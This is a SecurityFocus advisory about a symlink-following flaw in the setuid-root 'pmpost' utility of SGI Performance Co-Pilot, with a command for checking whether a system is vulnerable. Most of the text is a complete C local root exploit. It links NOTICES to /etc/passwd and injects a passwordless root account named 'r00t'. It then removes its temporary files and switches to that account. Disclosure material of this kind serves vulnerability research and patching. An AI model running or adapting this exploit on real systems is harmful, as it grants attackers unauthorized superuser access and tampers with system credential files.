source: http://www.securityfocus.com/bid/2887/info

Performance Co-Pilot (PCP) is a set of services to support system-level performance monitoring developed by SGI. It has traditionally been an IRIX product, however SGI has made it open source and it is now available for Linux systems.

One of the utilities that ships with PCP is called 'pmpost'. It is often installed setuid root by default. When writing to the 'NOTICES' file in its user-definable log directory, 'pmpost' will follow symbolic links. Since the data written is user-supplied (the command-line arguments), it is possible to gain superuser privileges if 'pmpost' is setuid root.

Note: This vulnerability affects both binary versions for IRIX and the open source distribution of PCP. S.u.S.E. has made PCP packages available for their linux distribution. PCP is not installed as part of S.u.S.E. Linux by default. The PCP packages for S.u.S.E. Linux 7.0 do not install 'pmpost' setuid root. Versions 7.1 and 7.2 do, and are vulnerable if PCP is installed.

It has been reported that not all versions of PCP for IRIX are vulnerable. To determine whether you are vulnerable, run this command:

strings /usr/pcp/bin/pmpost | grep PCP_LOG_DIR

If the string 'PCP_LOG_DIR' appears, it is most likely that the version of 'pmpost' installed is vulnerable.

It is not yet known which other Linux vendors may ship with PCP as either an optional package or installed by default. 

/********************************************************
*							*
*		pmpost local root exploit		*
*		vulnerable: pcp <= 2.1.11-5		*
*		by IhaQueR				*
*							*
********************************************************/




#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>



main()
{
const char *bin="/usr/share/pcp/bin/pmpost";
static char buf[512];
static char dir[128];


	srand(time(NULL));
	sprintf(dir, "/tmp/dupa.%.8d", rand());

	if(mkdir(dir, S_IRWXU))
		_exit(2);

	if(chdir(dir))
		_exit(3);

	if(symlink("/etc/passwd", "./NOTICES"))
		_exit(4);

	snprintf(buf, sizeof(buf)-1, "PCP_LOG_DIR=%.500s", dir);

	if(putenv(buf))
		_exit(5);

	if(!fork()) {
		execl(bin, bin, "\nr00t::0:0:root:/root:/bin/bash", NULL);
		_exit(1);
	}
	else {
		waitpid(0, NULL, WUNTRACED);
		chdir("..");
		sprintf(buf, "rm -rf dupa.*");
		system(buf);
		execl("/bin/su", "/bin/su", "r00t", NULL);
	}
}
